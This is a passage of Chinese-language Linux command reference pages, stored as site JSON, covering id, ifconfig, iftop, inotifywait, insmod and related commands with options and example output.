选项\n\n```shell\n-a               兼容性选项，没有实际作用。\n-Z, --context    只打印进程的安全上下文。\n-g, --group      只打印有效的组ID。\n-G, --groups     打印全部组ID。\n-u, --user       只打印有效的用户ID。\n-z, --zero       使用空字符代替默认的空格来分隔条目。\n--help           显示帮助信息并退出。\n--version        显示版本信息并退出。\n```\n\n只有在使用 `-u` `-g` `-G` 选项中一到多个时，以下选项可以使用：\n```shell\n-n, --name    打印名称而不是数字。\n-r, --real    打印真实ID而不是有效ID。\n```\n\n## 参数\nuser（可选）：可以为一到多个，默认为当前用户。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\n[root@localhost ~]# id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n\n解释：用户root的UID号码 = 0，GID号码 = 0。用户root是下面组的成员：\n\n* root组GID号是：0\n* bin组GID号是：1\n* daemon组GID号是：2\n* sys组GID号是：3\n* adm组GID号是：4\n* disk组GID号是：6\n* wheel组GID号是：10\n\n打印用户名、UID 和该用户所属的所有组，要这么做，我们可以使用 -a 选项：\n\n```shell\n[root@localhost ~]# id -a\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n\n输出所有不同的组ID ，有效的，真实的和补充的，我们可以使用 -G 选项来实现：\n\n```shell\n[root@localhost ~]# id -G\n0 1 2 3 4 6 10\n```\n\n结果只会显示GID号。你可以和`/etc/group`文件比较。下面是`/etc/group`文件的示例内容：\n\n只输出有效的组ID，通过使用 -g 选项来只输出有效组ID：\n\n```shell\n[root@localhost ~]# id -g\n0\n```\n\n输出特定用户信息，我们可以输出特定的用户信息相关的UID和GID。只需要在id命令后跟上用户名：\n\n```shell\n[root@localhost ~]# id www\nuid=500(www) gid=500(www) groups=500(www)\n```\n\n### 注意\n\n1. 该命令可以显示真实有效的用户ID(UID)和组ID(GID)。UID 是对一个用户的单一身份标识。组ID（GID）则对应多个UID；一些程序可能需要UID/GID来运行。`id` 使我们更加容易地找出用户的UID以及GID，而不必在 `/etc/group` 文件中搜寻。\n\n2. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 id`，`info coreutils 'id invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","id"]},{"title":"【Linux 命令】ifcfg","url":"/linux-command/ifcfg/","content":"\n置Linux中的网络接口参数\n\n## 补充说明\n\n**ifcfg命令** 是一个Bash脚本程序，用来设置Linux中的网络接口参数。\n\n###  语法\n\n```shell\nifcfg(参数)\n```\n\n###  参数\n\n```shell\n网络接口：指定要操作的网络接口；\nadd/del：添加或删除网络接口上的地址；\nip地址：指定IP地址和子网掩码；\nStop：停用指定的网络接口的IP地址。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ifcfg"]},{"title":"【Linux 命令】ifconfig","url":"/linux-command/ifconfig/","content":"\n配置和显示Linux系统网卡的网络参数\n\n## 补充说明\n\n**ifconfig命令** 被用于配置和显示Linux内核中网络接口的网络参数。用ifconfig命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了。\n\n###  语法 \n\n```shell\nifconfig(参数)\n```\n\n###  参数 \n\n```shell\nadd<地址>：设置网络设备IPv6的ip地址；\ndel<地址>：删除网络设备IPv6的IP地址；\ndown：关闭指定的网络设备；\n<hw<网络设备类型><硬件地址>：设置网络设备的类型与硬件地址；\nio_addr<I/O地址>：设置网络设备的I/O地址；\nirq<IRQ地址>：设置网络设备的IRQ；\nmedia<网络媒介类型>：设置网络设备的媒介类型；\nmem_start<内存地址>：设置网络设备在主内存所占用的起始地址；\nmetric<数目>：指定在计算数据包的转送次数时，所要加上的数目；\nmtu<字节>：设置网络设备的MTU；\nnetmask<子网掩码>：设置网络设备的子网掩码；\ntunnel<地址>：建立IPv4与IPv6之间的隧道通信地址；\nup：启动指定的网络设备；\n-broadcast<地址>：将要送往指定地址的数据包当成广播数据包来处理；\n-pointopoint<地址>：与指定地址的网络设备建立直接连线，此模式具有保密功能；\n-promisc：关闭或启动指定网络设备的promiscuous模式；\nIP地址：指定网络设备的IP地址；\n网络设备：指定网络设备的名称。\n```\n\n###  实例 \n\n **显示网络设备信息（激活状态的）：** \n\n```shell\n[root@localhost ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr 00:16:3E:00:1E:51  \n          inet addr:10.160.7.81  Bcast:10.160.15.255  Mask:255.255.240.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:61430830 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:88534 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:3607197869 (3.3 GiB)  TX bytes:6115042 (5.8 MiB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:56103 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:56103 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0\n          RX bytes:5079451 (4.8 MiB)  TX bytes:5079451 (4.8 MiB)\n```\n\n说明：\n\n**eth0** 表示第一块网卡，其中`HWaddr`表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是`00:16:3E:00:1E:51`。\n\n**inet addr** 用来表示网卡的IP地址，此网卡的IP地址是`10.160.7.81`，广播地址`Bcast:10.160.15.255`，掩码地址`Mask:255.255.240.0`。\n\n**lo** 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 httpd服务器的指定到回坏地址，在浏览器输入127.0.0.1就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。\n\n*   第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）。\n*   第二行：网卡的IP地址、子网、掩码。\n*   第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节。\n*   第四、五行：接收、发送数据包情况统计。\n*   第七行：接收、发送数据字节数统计信息。\n\n**启动关闭指定网卡：** \n\n```shell\nifconfig eth0 up\nifconfig eth0 down\n```\n\n`ifconfig eth0 up`为启动网卡eth0，`ifconfig eth0 down`为关闭网卡eth0。ssh登陆linux服务器操作要小心，关闭了就不能开启了，除非你有多网卡。\n\n**为网卡配置和删除IPv6地址：** \n\n```shell\nifconfig eth0 add 33ffe:3240:800:1005::2/64    #为网卡eth0配置IPv6地址\nifconfig eth0 del 33ffe:3240:800:1005::2/64    #为网卡eth0删除IPv6地址\n```\n\n**用ifconfig修改MAC地址：** \n\n```shell\nifconfig eth0 hw ether 00:AA:BB:CC:dd:EE\n```\n\n**配置IP地址：** \n\n```shell\n[root@localhost ~]# ifconfig eth0 192.168.2.10\n[root@localhost ~]# ifconfig eth0 192.168.2.10 netmask 255.255.255.0\n[root@localhost ~]# ifconfig eth0 192.168.2.10 netmask 255.255.255.0 broadcast 192.168.2.255\n```\n\n**启用和关闭arp协议：** \n\n```shell\nifconfig eth0 arp    #开启网卡eth0 的arp协议\nifconfig eth0 -arp   #关闭网卡eth0 的arp协议\n```\n\n**设置最大传输单元：** \n\n```shell\nifconfig eth0 mtu 1500    #设置能通过的最大数据包大小为 1500 bytes\n```\n\n**其它实例**\n\n```shell\nifconfig   #处于激活状态的网络接口\nifconfig -a  #所有配置的网络接口，不论其是否激活\nifconfig eth0  #显示eth0的网卡信息\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ifconfig"]},{"title":"【Linux 命令】ifdown","url":"/linux-command/ifdown/","content":"\n禁用指定的网络接口\n\n## 补充说明\n\n**ifdown命令** 用于禁用指定的网络接口。\n\n###  语法\n\n```shell\nifdown(参数)\n```\n\n###  参数\n\n网络接口：要禁用的网络接口。\n\n###  实例\n\n```shell\nifdown eth0  #禁用eth0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ifdown"]},{"title":"【Linux 命令】ifstat","url":"/linux-command/ifstat/","content":"\n统计网络接口流量状态\n\n## 补充说明\n\n**ifstat命令** 就像iostat/vmstat描述其它的系统状况一样，是一个统计网络接口活动状态的工具。ifstat工具系统中并不默认安装，需要自己下载源码包，重新编译安装，使用过程相对比较简单。\n\n###  下载 \n\n```shell\nhttp://gael.roualland.free.fr/ifstat/  （官网）\nwget http://gael.roualland.free.fr/ifstat/ifstat-1.1.tar.gz\n```\n\n###  编译安装 \n\n```shell\ntar -zxvf ifstat-1.1.tar.gz\ncd ifstat-1.1\n./configure            \nmake\nmake install # 默认会安装到/usr/local/bin/目录中\n```\n\n注释：执行`which ifstat`输出`/usr/local/bin/ifstat`\n\n###  选项 \n\n```shell\n-l 监测环路网络接口（lo）。缺省情况下，ifstat监测活动的所有非环路网络接口。经使用发现，加上-l参数能监测所有的网络接口的信息，而不是只监测 lo的接口信息，也就是说，加上-l参数比不加-l参数会多一个lo接口的状态信息。\n-a 监测能检测到的所有网络接口的状态信息。使用发现，比加上-l参数还多一个plip0的接口信息，搜索一下发现这是并口（网络设备中有一 个叫PLIP (Parallel Line Internet Protocol). 它提供了并口...）\n-z 隐藏流量是无的接口，例如那些接口虽然启动了但是未用的\n-i 指定要监测的接口,后面跟网络接口名\n-s 等于加-d snmp:[comm@][#]host[/nn]] 参数，通过SNMP查询一个远程主机\n-h 显示简短的帮助信息\n-n 关闭显示周期性出现的头部信息（也就是说，不加-n参数运行ifstat时最顶部会出现网络接口的名称，当一屏显示不下时，会再一次出现接口的名称，提示我们显示的流量信息具体是哪个网络接口的。加上-n参数把周期性的显示接口名称关闭，只显示一次）\n-t 在每一行的开头加一个时间 戳（能告诉我们具体的时间）\n-T 报告所有监测接口的全部带宽（最后一列有个total，显示所有的接口的in流量和所有接口的out流量，简单的把所有接口的in流量相加,out流量相 加）\n-w  用指定的列宽，而不是为了适应接口名称的长度而去自动放大列宽\n-W 如果内容比终端窗口的宽度还要宽就自动换行\n-S 在同一行保持状态更新（不滚动不换行）注：如果不喜欢屏幕滚动则此项非常方便，与bmon的显示方式类似\n-b 用kbits/s显示带宽而不是kbytes/s\n-q 安静模式，警告信息不出现\n-v 显示版本信息\n-d 指定一个驱动来收集状态信息\n```\n\n###  实例 \n\n默认使用\n\n```shell\n[root@localhost ifstat-1.1] #ifstat\n       eth0                eth1       \n KB/s in  KB/s out   KB/s in  KB/s out\n    0.07      0.20      0.00      0.00\n    0.07      0.15      0.58      0.00\n```\n\n默认ifstat不监控回环接口，显示的流量单位是KB。\n\n```shell\n[root@localhost ifstat-1.1]# ifstat -tT\n  time           eth0                eth1                eth2                eth3               Total      \nHH:MM:ss   KB/s in  KB/s out   KB/s in  KB/s out   KB/s in  KB/s out   KB/s in  KB/s out   KB/s in  KB/s out\n16:53:04      0.84      0.62   1256.27   1173.05      0.12      0.18      0.00      0.00   1257.22   1173.86\n16:53:05      0.57      0.40      0.57      0.76      0.00      0.00      0.00      0.00      1.14      1.17\n16:53:06      1.58      0.71      0.42      0.78      0.00      0.00      0.00      0.00      2.01      1.48\n16:53:07      0.57      0.40      1.91      2.61      0.00      0.00      0.00      0.00      2.48      3.01\n16:53:08      0.73      0.40    924.02   1248.91      0.00      0.00      0.00      0.00    924.76   1249.31\n```\n\n监控所有网络接口\n\n```shell\n[root@localhost ifstat-1.1] # ifstat -a\n        lo                 eth0                eth1       \n KB/s in  KB/s out   KB/s in  KB/s out   KB/s in  KB/s out\n    0.00      0.00      0.28      0.58      0.06      0.06\n    0.00      0.00      1.41      1.13      0.00      0.00\n    0.61      0.61      0.26      0.23      0.00      0.00\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ifstat"]},{"title":"【Linux 命令】iftop","url":"/linux-command/iftop/","content":"\n一款实时流量监控工具\n\n## 补充说明\n\n**iftop命令** 是一款实时流量监控工具，监控TCP/IP连接等，缺点就是无报表功能。必须以root身份才能运行。\n\n###  语法\n\n```shell\niftop(选项)\n```\n\n###  选项\n\n```shell\niftop: display bandwidth usage on an interface by host\n\nSynopsis: iftop -h | [-npblNBP] [-i interface] [-f filter code]\n    [-F net/mask] [-G net6/mask6]\n\n   -h                  display this message\n   -n                  don't do hostname lookups\n   -N                  don't convert port numbers to services\n   -p                  run in promiscuous mode (show traffic between other\n                       hosts on the same network segment)\n   -b                  don't display a bar graph of traffic\n   -B                  Display bandwidth in bytes\n   -i interface        listen on named interface\n   -f filter code      use filter code to select packets to count\n                      (default: none, but only IP packets are counted)\n   -F net/mask         show traffic flows in/out of IPv4 network\n   -G net6/mask6       show traffic flows in/out of IPv6 network\n   -l                  display and count link-local IPv6 traffic (default: off)\n   -P                  show ports as well as hosts\n   -m limit            sets the upper limit for the bandwidth scale\n   -c config file      specifies an alternative configuration file\n   -t                  use text interface without ncurses\n   \n   Sorting orders:\n   -o 2s                Sort by first column (2s traffic average)\n   -o 10s               Sort by second column (10s traffic average) [default]\n   -o 40s               Sort by third column (40s traffic average)\n   -o source            Sort by source address\n   -o destination       Sort by destination address\n   \n   The following options are only available in combination with -t\n   -s num              print one single text output afer num seconds, then quit\n   -L num              number of lines to print\n```\n\n### 界面说明\n\n> 第一行为带宽，这里为1Mbit,不是字节哦.\n> 连接列表，最后三列分别是2秒，10秒和40秒的平均流量\n> `=>` 代表发送  \n> `<=` 代表接收\n> 最后三行表示发送，接收和全部的流量，\n> 第二列为你运行iftop到目前流量，第三列为高峰值，第四列为平均值。\n\n###  实例\n\n```shell\niftop           # 默认是监控第一块网卡的流量\niftop -i eth1   # 监控eth1\niftop -n        # 直接显示IP, 不进行DNS反解析\niftop -N        # 直接显示连接埠编号, 不显示服务名称\niftop -F 192.168.1.0/24 or 192.168.1.0/255.255.255.0  # 显示某个网段进出封包流量\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iftop"]},{"title":"【Linux 命令】ifup","url":"/linux-command/ifup/","content":"\n激活指定的网络接口\n\n## 补充说明\n\n**ifup命令** 用于激活指定的网络接口。\n\n###  语法\n\n```shell\nifup(参数)\n```\n\n###  参数\n\n网络接口：要激活的网络接口。\n\n###  实例\n\n```shell\nifup eth0   #激活eth0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ifup"]},{"title":"【Linux 命令】indent","url":"/linux-command/indent/","content":"\n格式化C语言的源文件\n\n## 补充说明\n\n**indent命令** 可辨识C的原始代码文件，并加以格式化，以方便程序员阅读、修改等操作。\n\n###  语法\n\n```shell\nindent(选项)(源文件)\n或\nindent（选项)(源文件)(-o 目标文件)\n```\n\n###  选项\n\n```shell\n-bad：在声明区加上空白行；\n-bap：添加空白行；\n-bbb：在注释后面添加空白行；\n-bc：在声明段中，如果出现逗号就换行；\n-bl：if（或是else、for等）与后面执行区段的“{”不同行，且“}”自成一行-bli<缩排格数>设置{}缩排的格数；\n-br：if（或是else、for等）与后面执行区段的“{”同行，且“}”自成一行；\n-bs：在sizeof之后空一格；\n-c<栏数>：将注释置于程序右侧指定的栏位；\n-cd<栏数>：将注释置于声明右侧指定的栏位；\n-cdb：注释符号自成一行；\n-ce：将else置于“}”（if执行区段的结尾）之后；\n-ci：<缩排格数>：叙述过长而换行时，指定换行后缩排的格数；\n-cli<缩排格数>：使用case时，switch缩排的格数；\n-cp<栏数>：将注释置于else与elseif叙述右侧指定的栏位；\n-cs：在case之后空一格；\n-d<缩排格数>：针对不是放在程序码右侧的注释，设置其缩排格数；\n-di<栏数>：将声明区段的变量置于指定的栏位；\n-fc1：针对放在每行最前端的注释，设置其格式；\n-fca：设置所有注释的格式；\n-gnu：使用指定的GNU格式，该参数为默认值；\n-i<格数>：设置缩排的格数；\n-ip<格数>：设置参数的缩排格数；\n-kr：指定使用Kernighan&Ritchie的格式；\n-lp：叙述过长而换行，且叙述中包含了括号时，将括号中的每行起始栏位内容垂直对其排列；\n-nbad：在声明区段后不要加上空白行；\n-nbap：在程序后面不添加空白行；\n-nbbb：在注释段后面不添加空白行；\n-nbc：在声明段中，即使出现逗号，也不换行；\n-ncdb：注释符号不自成一行；\n-nce：不将else置于“}”后面；\n-ncs：不在case后面空一格；\n-nfc1：不要格式化放在每行最前端的注释；\n-nfca：不用格式化任何的注释；\n-nip：参数不要缩排；\n-nlp：叙述过长而换行，且叙述中包含了括号时，不用将括号中的每行起始栏位垂直对其排列；\n-npcs：在调用函数名之后，不要添加空格；\n-npro：不要读取indent的配置文件“.indent.pro”；\n-npsl：程序类型与程序名称放在同一行；\n-nsc：注释左侧不要添加星号；\n-nsob：不用处理多余的空白行；\n-nss：若for或while区段仅有一行时，在分号前不加空格；\n-nv：不显示详细的信息；\n-orig：使用berkeley格式；\n-pcs：在调用函数名与“{”之间添加空格；\n-psl：程序类型置于程序名称的前一行；\n-sc：在每行注释左侧添加星号；\n-sob：删除多余的空白行；\n-ss：若for或swile区段仅有一行时，在分号前加上空格；\n-st：将结果显示在标准输出设备上；\n-T：数据类型名称缩排；\n-ts<格数>：设置tab的长度；\n-v：显示详细的执行过程；\n--version：显示版本信息。\n```\n\n###  实例\n\n使用indent命令将C语言源文件\"test.c\"中所有的sizeof后面添加一个空格，输入如下命令：\n\n```shell\nindent -bs /home/rootlocal/桌面/test.c\n```\n\n执行上面的命令后，用户可以打开指定的源文件查看在sizeof后面是否都添加了一个空格。由于该命令的参数非常多，所以用户可以根据实际需要选择适合的参数进行使用即可。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","indent"]},{"title":"【Linux 命令】info","url":"/linux-command/info/","content":"\nLinux下info格式的帮助指令\n\n## 补充说明\n\n**info命令** 是Linux下info格式的帮助指令。\n\n就内容来说，info页面比man page编写得要更好、更容易理解，也更友好，但man page使用起来确实要更容易得多。一个man page只有一页，而info页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。理解这个命令的窍门就是不仅要学习如何在单独的Info页面中浏览导航，还要学习如何在节点和子节点之间切换。可能刚开始会一时很难在info页面的节点之间移动和找到你要的东西，真是具有讽刺意味：原本以为对于新手来说，某个东西比man命令会更好些，但实际上学习和使用起来更困难。\n\n###  语法\n\n```shell\ninfo(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：添加包含info格式帮助文档的目录；\n-f：指定要读取的info格式的帮助文档；\n-n：指定首先访问的info帮助文件的节点；\n-o：输出被选择的节点内容到指定文件。\n```\n\n###  参数\n\n帮助主题：指定需要获得帮助的主题，可以是指令、函数以及配置文件。\n\n###  实例\n\n在info后面输入命令的名称就可以查看该命令的info帮助文档了：\n\n```shell\ninfo info\n```\n\n面介绍一下它的几个常用快捷键。\n\n```shell\n **?键：** 它就会显示info的常用快捷键。\n **N键：** 显示（相对于本节点的）下一节点的文档内容。\n **P键：** 显示（相对于本节点的）前一节点的文档内容。\n **U键：** 进入当前命令所在的主题。\n **M键：** 敲M键后输入命令的名称就可以查看该命令的帮助文档了。\n **G键：** 敲G键后输入主题名称，进入该主题。\n **L键：** 回到上一个访问的页面。\n **SPACE键：** 向前滚动一页。\n **BACKUP或DEL键：** 向后滚动一页。\n **Q：** 退出info。\n```\n\n**命令** \n\n```shell\n **？**      显示帮助窗口\n\n在帮助窗口中：\n **Ctrl-x 0**           关闭帮助窗口\n **Ctrl-x Ctrl-c**     关闭整个 Info\n\n **q**       退出 info\n **n**       打开与本 Node 关联的下一个 Node\n **p**       打开与本 Node 关联的前一个 Node\n **u**       打开与本 Node 关联的上一个 Node\n **l**       回到上一次访问的 Node\n **m或g**    选择一个菜单项（Node 的名字）\n       输入指定菜单的名字后按回车，打开指定菜单项关联的 Node\n **空格键**  下一页（PageDown 也可以，下一页从当前页的最后两行开始算起）\n       下一个 Node （若当前页在 Node 文档的末尾）\n **Del 键**  上一页（PageUp 也可以，上一页从当前页的开始两行开始算起）\n       上一个 Node （若当前页 Node 文档的开始）\n\n **b 或 t 或 Home**    文档的开始（b 是 begining 的意思）\n **e 或 End**          文档的末尾（b 是 ending 的意思）\n **Ctrl-l**     刷新当前页，若当前文档显示情况有问题时\n **Ctrl-g**     取消所键入的指令\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","info"]},{"title":"【Linux 命令】init","url":"/linux-command/init/","content":"\ninit进程是所有Linux进程的父进程\n\n## 补充说明\n\n**init命令** 是Linux下的进程初始化工具，init进程是所有Linux进程的父进程，它的进程号为1。init命令是Linux操作系统中不可缺少的程序之一，init进程是Linux内核引导运行的，是系统中的第一个进程。\n\n###  语法\n\n```shell\ninit(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b：不执行相关脚本而直接进入单用户模式；\n-s：切换到单用户模式。\n```\n\n###  参数\n\n运行等级：指定Linux系统要切换到的运行等级。\n\n###  实例\n\n几个常用的命令\n\n查看系统进程命令：`ps -ef | head`  \n查看init的配置文件：`more /etc/inittab`  \n查看系统当前运行的级别：`runlevel`\n\n **运行级别** \n\n到底什么是运行级呢？简单的说，运行级就是操作系统当前正在运行的功能级别。这个级别从0到6 ，具有不同的功能。你也可以在`/etc/inittab`中查看它的英文介绍。\n\n```shell\n#0  停机（千万不能把initdefault 设置为0）\n#1  单用户模式\n#2  多用户，没有 NFS(和级别3相似，会停止部分服务)\n#3  完全多用户模式\n#4  没有用到\n#5  x11(Xwindow)\n#6  重新启动（千万不要把initdefault 设置为6）\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","init"]},{"title":"【Linux 命令】inotifywait","url":"/linux-command/inotifywait/","content":"\n异步文件系统监控机制\n\n## 补充说明\n\n**Inotify** 一种强大的、细粒度的、异步文件系统监控机制，它满足各种各样的文件监控需要，可以监控文件系统的访问属性、读写属性、权限属性、删除创建、移动等操作，也就是可以监控文件发生的一切变化。。\n\n **inotify-tools** 是一个C库和一组命令行的工作提供Linux下inotify的简单接口。inotify-tools安装后会得到`inotifywait`和`inotifywatch`这两条命令：\n\n*    **inotifywait命令** 可以用来收集有关文件访问信息，Linux发行版一般没有包括这个命令，需要安装inotify-tools，这个命令还需要将inotify支持编译入Linux内核，好在大多数Linux发行版都在内核中启用了inotify。\n*    **inotifywatch命令** 用于收集关于被监视的文件系统的统计数据，包括每个 inotify 事件发生多少次。\n\n开始之前需要检测系统内核是否支持inotify：\n\n使用`uname -r`命令检查Linux内核，如果低于2.6.13，就需要重新编译内核加入inotify的支持。\n\n使用`ll /proc/sys/fs/inotify`命令，是否有以下三条信息输出，如果没有表示不支持。\n\n```shell\nll /proc/sys/fs/inotify\ntotal 0\n-rw-r--r-- 1 root root 0 Jan  4 15:41 max_queued_events\n-rw-r--r-- 1 root root 0 Jan  4 15:41 max_user_instances\n-rw-r--r-- 1 root root 0 Jan  4 15:41 max_user_watches\n```\n\n###  安装inotify-tools\n\n*   inotify-tools项目地址：https://github.com/rvoicilas/inotify-tools\n*   inotify-tools下载地址：http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz\n\n```shell\n#CentOS release 5.8/64位：\ntar zxvf inotify-tools-3.14.tar.gz\ncd inotify-tools-3.14\n./configure\nmake\nmake install\n```\n\n其他Linux发行版安装方法可以参见：https://github.com/rvoicilas/inotify-tools/wiki#wiki-getting\n\n###  inotify相关参数\n\ninotify定义了下列的接口参数，可以用来限制inotify消耗kernel memory的大小。由于这些参数都是内存参数，因此，可以根据应用需求，实时的调节其大小：\n\n*   `/proc/sys/fs/inotify/max_queued_evnets`表示调用inotify_init时分配给inotify instance中可排队的event的数目的最大值，超出这个值的事件被丢弃，但会触发IN_Q_OVERFLOW事件。\n*   `/proc/sys/fs/inotify/max_user_instances`表示每一个real user id可创建的inotify instatnces的数量上限。\n*   `/proc/sys/fs/inotify/max_user_watches`表示每个inotify instatnces可监控的最大目录数量。如果监控的文件数目巨大，需要根据情况，适当增加此值的大小。\n\n根据以上在32位或者64位系统都可以执行：\n\n```shell\necho 104857600 > /proc/sys/fs/inotify/max_user_watches\necho 'echo 104857600 > /proc/sys/fs/inotify/max_user_watches' >> /etc/rc.local\n```\n\n如果遇到以下错误：\n\n```shell\ninotifywait: error while loading shared libraries: libinotifytools.so.0: cannot open shared object file: No such file or directory \n```\n\n```shell\n **解决方法：** \n32位系统：ln -s /usr/local/lib/libinotifytools.so.0 /usr/lib/libinotifytools.so.0\n64位系统：ln -s /usr/local/lib/libinotifytools.so.0 /usr/lib64/libinotifytools.so.0\n```\n\n###  inotifywait命令使用\n\n```shell\n#!/bin/bash\n#filename watchdir.sh\npath=$1\n/usr/local/bin/inotifywait -mrq --timefmt '%d/%m/%y/%H:%M' --format '%T %w %f' -e modify,delete,create,attrib $path\n\n执行输出：\n./watchdir.sh /data/wsdata/tools/\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swx\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swx\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp\n04/01/13/16:35 /data/wsdata/tools/ 4913\n04/01/13/16:35 /data/wsdata/tools/ 4913\n04/01/13/16:35 /data/wsdata/tools/ 4913\n04/01/13/16:35 /data/wsdata/tools/ j.jsp\n04/01/13/16:35 /data/wsdata/tools/ j.jsp\n04/01/13/16:35 /data/wsdata/tools/ j.jsp\n04/01/13/16:35 /data/wsdata/tools/ j.jsp~\n04/01/13/16:35 /data/wsdata/tools/ .j.jsp.swp\n```\n\n###  inotifywait命令参数\n\n* `-m`是要持续监视变化。\n* `-r`使用递归形式监视目录。\n* `-q`减少冗余信息，只打印出需要的信息。\n* `-e`指定要监视的事件列表。\n* `--timefmt`是指定时间的输出格式。\n* `--format`指定文件变化的详细信息。\n\n### 可监听的事件\n\n事件 | 描述\n--- | ---\naccess | **访问** ，读取文件。\nmodify | **修改** ，文件内容被修改。\nattrib | **属性** ，文件元数据被修改。\nmove | **移动** ，对文件进行移动操作。\ncreate | **创建** ，生成新文件\nopen | **打开** ，对文件进行打开操作。\nclose | **关闭** ，对文件进行关闭操作。\ndelete | **删除** ，文件被删除。\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","inotifywait"]},{"title":"【Linux 命令】insmod","url":"/linux-command/insmod/","content":"\n将给定的模块加载到内核中\n\n## 补充说明\n\n**insmod命令** 用于将给定的模块加载到内核中。Linux有许多功能是通过模块的方式，在需要时才载入kernel。如此可使kernel较为精简，进而提高效率，以及保有较大的弹性。这类可载入的模块，通常是设备驱动程序。\n\n###  语法\n\n```shell\ninsmod(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：不检查目前kernel版本与模块编译时的kernel版本是否一致，强制将模块载入；\n-k：将模块设置为自动卸除；\n-m：输出模块的载入信息；\n-o<模块名称>：指定模块的名称，可使用模块文件的文件名；\n-p：测试模块是否能正确地载入kernel；\n-s：将所有信息记录在系统记录文件中；\n-v：执行时显示详细的信息；\n-x：不要汇出模块的外部符号；\n-X：汇出模块所有的外部符号，此为预设置。\n```\n\n###  参数\n\n内核模块：指定要加载的内核模块文件。\n\n###  实例\n\n加载RAID1阵列级别模块，如下所示：\n\n```shell\n[root@localhost boot]# insmod /lib/modules/2.6.\n18-8.el5/kernel/drivers/md/raid1.ko  \n\n[root@localhost boot]# lsmod | grep raid1\nraid1                  25153  0\n```\n\n从以上显示结果可知，RAID1模块已加载成功。只是在使用insmod命令加载模块时，需要使用绝对路径方能加载，且加载时无法自动解决依赖关系。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","insmod"]},{"title":"【Linux 命令】install","url":"/linux-command/install/","content":"\n安装或升级软件或备份数据\n\n## 补充说明\n\n**install命令** 的作用是安装或升级软件或备份数据，它的使用权限是所有用户。install命令和cp命令类似，都可以将文件/目录拷贝到指定的地点。但是，install允许你控制目标文件的属性。install通常用于程序的makefile，使用它来将程序拷贝到目标（安装）目录。\n\n###  语法\n\n```shell\ninstall [OPTION]... [-T] SOURCE DEST\ninstall [OPTION]... SOURCE... DIRECTORY\ninstall [OPTION]... -t DIRECTORY SOURCE...\ninstall [OPTION]... -d DIRECTORY...\n```\n\n在前两种格式中，会将<来源>复制至<目的地>或将多个<来源>文件复制至已存在的<目录>，同时设定权限模式及所有者/所属组。在第三种格式中，会创建所有指定的目录及它们的主目录。长选项必须用的参数在使用短选项时也是必须的。\n\n###  选项\n\n```shell\n--backup[=CONTROL]：为每个已存在的目的地文件进行备份。\n-b：类似 --backup，但不接受任何参数。\n-c：(此选项不作处理)。\n-d，--directory：所有参数都作为目录处理，而且会创建指定目录的所有主目录。\n-D：创建<目的地>前的所有主目录，然后将<来源>复制至 <目的地>；在第一种使用格式中有用。\n-g，--group=组：自行设定所属组，而不是进程目前的所属组。\n-m，--mode=模式：自行设定权限模式 (像chmod)，而不是rwxr-xr-x。\n-o，--owner=所有者：自行设定所有者 (只适用于超级用户)。\n-p，--preserve-timestamps：以<来源>文件的访问/修改时间作为相应的目的地文件的时间属性。\n-s，--strip：用strip命令删除symbol table，只适用于第一及第二种使用格式。\n-S，--suffix=后缀：自行指定备份文件的<后缀>。\n-v，--verbose：处理每个文件/目录时印出名称。\n--help：显示此帮助信息并离开。\n--version：显示版本信息并离开。\n```\n\n###  